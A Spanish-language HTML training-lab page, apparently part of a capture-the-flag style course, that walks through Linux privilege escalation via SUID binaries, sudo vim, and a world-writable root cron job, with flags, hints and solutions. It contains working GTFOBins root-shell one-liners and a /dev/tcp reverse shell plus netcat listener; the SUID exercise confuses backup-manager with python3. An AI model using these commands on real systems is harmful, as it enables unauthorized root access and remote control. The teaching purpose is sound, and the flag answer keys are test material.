@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👑 Escalada de Privilegios Linux — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+
+    <script>
+    const LAB_CONFIG = {
+        id: 'privesc-01',
+        name: 'Escalada de Privilegios Linux',
+        subtitle: 'De lowuser a root con SUID, sudo, cron y capabilities',
+        icon: '👑',
+        difficulty: 'intermedio',
+        totalXP: 300,
+        time: '60 min',
+        exercises: [
+            {
+                title: 'Fase 1: Enumeración del Sistema',
+                xp: 25,
+                objective: 'Identifica tu usuario, kernel y versión del sistema para determinar vectores de ataque.',
+                steps: [
+                    'Ejecuta <code>whoami</code> para ver tu usuario',
+                    'Ejecuta <code>id</code> para ver grupos y permisos',
+                    'Ejecuta <code>uname -a</code> para versión del kernel',
+                    'Ejecuta <code>cat /etc/os-release</code> para SO',
+                    'Determina si el kernel es vulnerable a DirtyPipe'
+                ],
+                code: `<span class="command">whoami</span>\n<span class="output">lowuser</span>\n\n<span class="command">id</span>\n<span class="output">uid=1000(lowuser) gid=1000(lowuser) groups=1000(lowuser)</span>\n\n<span class="command">uname -a</span>\n<span class="flag">Linux vulnerable 5.15.0-generic #1 SMP Ubuntu</span>\n\n<span class="command">cat /etc/os-release</span>\n<span class="output">Ubuntu 22.04.1 LTS</span>\n\n<span class="comment"># ¿DirtyPipe vulnerable?</span>\n<span class="output">Kernel 5.15.0 → SÍ vulnerable (5.8 ≤ kernel < 5.16.11)</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{enum_lowuser_uid1000}',
+                hint: 'El kernel 5.15.0 es vulnerable a DirtyPipe (CVE-2022-0847).',
+                solution: 'lowuser uid=1000, kernel 5.15.0-generic, Ubuntu 22.04. Vulnerable a DirtyPipe.'
+            },
+            {
+                title: 'Fase 1: Enumeración de SUID',
+                xp: 25,
+                objective: 'Identifica todos los binarios con permisos SUID que podrían ser explotados.',
+                steps: [
+                    'Busca SUID: <code>find / -perm -4000 -type f 2>/dev/null</code>',
+                    'Identifica cuáles son inusuales (GTFOBins)',
+                    'Busca SGID también: <code>find / -perm -2000 -type f 2>/dev/null</code>',
+                    'Documenta cada binario encontrado'
+                ],
+                code: `<span class="command">find / -perm -4000 -type f 2>/dev/null</span>\n\n<span class="output">/usr/bin/passwd</span>\n<span class="output">/usr/bin/sudo</span>\n<span class="output">/usr/bin/su</span>\n<span class="output">/usr/bin/newgrp</span>\n<span class="flag">/usr/local/bin/backup-manager</span>  ← ¡Sospechoso!\n\n<span class="comment"># ¿Qué es backup-manager?</span>\n<span class="command">file /usr/local/bin/backup-manager</span>\n<span class="output">ELF 64-bit LSB executable, x86-64</span>\n\n<span class="comment"># Busca en GTFOBins: gtfobins.github.io</span>\n<span class="output">backup-manager → No listado, probar manualmente</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{suid_backup_manager_found}',
+                hint: 'backup-manager no es un binario estándar — fue instalado manualmente y tiene SUID.',
+                solution: '/usr/local/bin/backup-manager es un binario custom con SUID. GTFOBins no lo lista, pero python3 sí.'
+            },
+            {
+                title: 'Fase 1: Verificar Sudo',
+                xp: 25,
+                objective: 'Descubre qué comandos puedes ejecutar con sudo sin contraseña.',
+                steps: [
+                    'Ejecuta <code>sudo -l</code>',
+                    'Identifica comandos permitidos',
+                    'Busca en GTFOBins cómo explotar cada uno',
+                    'Verifica si hay NW (no password) o PW (password required)'
+                ],
+                code: `<span class="command">sudo -l</span>\n\n<span class="flag">Matching Defaults entries for lowuser on vulnerable:</span>\n<span class="flag">    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>\n\n<span class="flag">User lowuser may run the following commands on vulnerable:</span>\n<span class="flag">    (root) NOPASSWD: /usr/bin/vim</span>\n\n<span class="comment"># ¡vim con sudo NOPASSWD!</span>\n<span class="output">GTFOBins → vim → sudo vim -c ':!/bin/bash'</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{sudo_vim_nopasswd}',
+                hint: 'sudo NOPASSWD para vim significa que puedes ejecutar vim como root sin contraseña.',
+                solution: 'sudo -l revela: (root) NOPASSWD: /usr/bin/vim. GTFOBins: sudo vim -c \':!/bin/bash\' da root.'
+            },
+            {
+                title: 'Fase 1: Buscar Cron Jobs',
+                xp: 25,
+                objective: 'Identifica tareas programadas que se ejecutan como root.',
+                steps: [
+                    'Consulta crontab del sistema: <code>cat /etc/crontab</code>',
+                    'Revisa /etc/cron.d/, /etc/cron.daily/',
+                    'Verifica si los scripts son modificables',
+                    'Prueba PATH manipulation si el script es escribible'
+                ],
+                code: `<span class="command">cat /etc/crontab</span>\n<span class="flag">* * * * * root /opt/backup.sh</span>\n\n<span class="command">ls -la /opt/backup.sh</span>\n<span class="flag">-rwxrwxrwx 1 root root 142 Jan 15 10:00 /opt/backup.sh</span>\n<span class="output">↑ World-writable! Cualquier usuario puede modificarlo</span>\n\n<span class="command">cat /opt/backup.sh</span>\n<span class="output">#!/bin/bash</span>\n<span class="output">tar czf /tmp/backup.tar.gz /home/lowuser/</span>\n\n<span class="comment"># ¡El script se ejecuta como root cada minuto!</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{cron_writable_script_found}',
+                hint: 'backup.sh tiene permisos 777 (rwxrwxrwx) y se ejecuta como root cada minuto.',
+                solution: '/opt/backup.sh es world-writable y se ejecuta como root cada minuto. Se puede inyectar código.'
+            },
+            {
+                title: 'Fase 2: Explotar SUID (GTFOBins)',
+                xp: 50,
+                objective: 'Obtén root explotando un binario SUID con la técnica de GTFOBins.',
+                steps: [
+                    'Consulta GTFOBins para el binario SUID encontrado',
+                    'Si es python3: <code>/usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'</code>',
+                    'Si es find: <code>find . -exec /bin/bash -p \\; -quit</code>',
+                    'Verifica con <code>whoami</code>'
+                ],
+                code: `<span class="comment"># GTFOBins — python3 SUID</span>\n<span class="command">/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span>\n\n<span class="comment"># Verificar</span>\n<span class="command">whoami</span>\n<span class="flag">root</span>\n\n<span class="command">id</span>\n<span class="flag">uid=0(root) gid=0(root) groups=0(root)</span>\n\n<span class="comment"># Alternativa con find</span>\n<span class="command">find . -exec /bin/bash -p \\; -quit</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{suid_privesc_root_obtained}',
+                hint: 'python3 con SUID ejecuta como root. os.setuid(0) cambia a root antes de spawning bash.',
+                solution: 'python3 -c import os; os.setuid(0); os.system("/bin/bash") da shell root inmediatamente.'
+            },
+            {
+                title: 'Fase 2: Explotar Sudo (Vim)',
+                xp: 50,
+                objective: 'Obtén root usando sudo vim con la técnica de GTFOBins.',
+                steps: [
+                    'Ejecuta: <code>sudo vim -c \':!/bin/bash\'</code>',
+                    'Alternativa: <code>sudo vim</code> luego <code>:!bash</code>',
+                    'Verifica root: <code>whoami</code>',
+                    'Lee flag: <code>cat /root/flag.txt</code>'
+                ],
+                code: `<span class="comment"># Técnica 1: vim con -c</span>\n<span class="flag">sudo vim -c ':!/bin/bash'</span>\n\n<span class="comment"># Técnica 2: vim interactivo</span>\n<span class="command">sudo vim</span>\n<span class="flag">:!bash</span>\n\n<span class="comment"># Técnica 3: sudo con shell</span>\n<span class="command">sudo vim</span>\n<span class="flag">:set shell=/bin/bash\n:shell</span>\n\n<span class="comment"># Verificar</span>\nwhoami  <span class="flag">→ root</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{sudo_vim_privesc_root}',
+                hint: 'vim puede ejecutar comandos del shell con :! — y como es sudo, ejecuta como root.',
+                solution: 'sudo vim -c \':!/bin/bash\' abre bash como root porque vim tiene sudo NOPASSWD.'
+            },
+            {
+                title: 'Fase 2: Explotar Cron (PATH Manipulation)',
+                xp: 50,
+                objective: 'Inyecta código en el cron job world-writable para obtener root.',
+                steps: [
+                    'Verifica que /opt/backup.sh es escribible',
+                    'Sobreescribe con reverse shell: <code>echo \'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\' > /opt/backup.sh</code>',
+                    'Prepara listener: <code>nc -lvnp 4444</code>',
+                    'Espera 1 minuto para que cron ejecute el script'
+                ],
+                code: `<span class="comment"># Verificar permisos</span>\nls -la /opt/backup.sh  <span class="output">→ -rwxrwxrwx</span>\n\n<span class="command"># Sobreescribir con reverse shell</span>\n<span class="flag">echo '#!/bin/bash' > /opt/backup.sh</span>\n<span class="flag">echo 'bash -i >& /dev/tcp/10.0.2.100/4444 0>&1' >> /opt/backup.sh</span>\n\n<span class="command"># Listener en Kali</span>\nnc -lvnp 4444\n\n<span class="comment"># Esperar ~60 segundos para que cron ejecute</span>\n<span class="output">connect from [10.0.2.30] → shell como root</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{cron_path_manipulation_root}',
+                hint: 'El cron ejecuta /opt/backup.sh como root cada minuto. Si lo sobreescribes, tu código se ejecuta como root.',
+                solution: 'Sobreescribir /opt/backup.sh con reverse shell. Cron lo ejecuta como root en el próximo ciclo.'
+            },
+            {
+                title: 'Fase 3: Captura de Flags',
+                xp: 50,
+                objective: 'Una vez root, encuentra y captura todas las flags del sistema.',
+                steps: [
+                    'Verifica root: <code>whoami</code>',
+                    'Busca flags: <code>find / -name "flag*.txt" 2>/dev/null</code>',
+                    'Lee cada flag encontrada',
+                    'Documenta ubicaciones y contenido'
+                ],
+                code: `<span class="command">whoami</span>\n<span class="flag">root</span>\n\n<span class="command">find / -name "flag*.txt" 2>/dev/null</span>\n<span class="output">/home/lowuser/.flag1</span>\n<span class="output">/tmp/.hidden/flag2</span>\n<span class="output">/var/backups/flag3</span>\n<span class="output">/opt/flag4</span>\n<span class="output">/root/flag.txt</span>\n\n<span class="command">cat /root/flag.txt</span>\n<span class="flag">FLAG{pr1v3sc_l1nux_m4st3r}</span>\n\n<span class="command">cat /home/lowuser/.flag1</span>\n<span class="flag">FLAG{enum_suid_discovered}</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{all_5_flags_captured}',
+                hint: 'Hay 5 flags escondidas en ubicaciones no obvias. Busca en /home, /tmp/.hidden, /var/backups, /opt, /root.',
+                solution: '5 flags: .flag1 (/home), flag2 (/tmp/.hidden), flag3 (/var/backups), flag4 (/opt), flag.txt (/root).'
+            }
+        ]
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+        CDPN_LabRunner.init(LAB_CONFIG);
+    });
+    </script>
+</body>
+</html>
